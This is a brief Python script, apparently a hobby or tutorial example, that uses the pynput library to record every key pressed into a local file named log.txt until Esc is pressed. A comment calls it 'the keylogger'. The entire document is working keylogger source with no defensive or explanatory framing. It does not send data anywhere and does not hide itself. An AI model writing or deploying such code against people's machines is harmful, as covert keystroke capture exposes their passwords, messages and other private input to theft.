from pynput import keyboard
import logging

log = 'log.txt'
logging.basicConfig(filename=log, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    logging.info(str(key))

def on_release(key):
    #Press esc to stop the keylogger
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print(listener.join())
